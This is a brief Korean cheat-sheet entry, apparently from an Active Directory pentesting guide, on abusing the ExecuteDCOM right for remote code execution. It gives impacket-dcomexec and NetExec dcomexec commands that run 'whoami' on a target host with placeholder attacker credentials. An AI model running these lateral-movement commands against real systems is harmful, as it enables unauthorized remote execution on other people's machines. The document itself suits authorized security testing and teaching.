# 13_ExecuteDCOM

DCOM을 통한 원격 코드 실행 권한이다.

```bash
impacket-dcomexec <도메인>/<공격자계정>:'<패스워드>'@<대상IP> 'whoami'  # ← 수정
nxc smb <대상IP> -u <공격자계정> -p '<패스워드>' -M dcomexec -o COMMAND='whoami'
```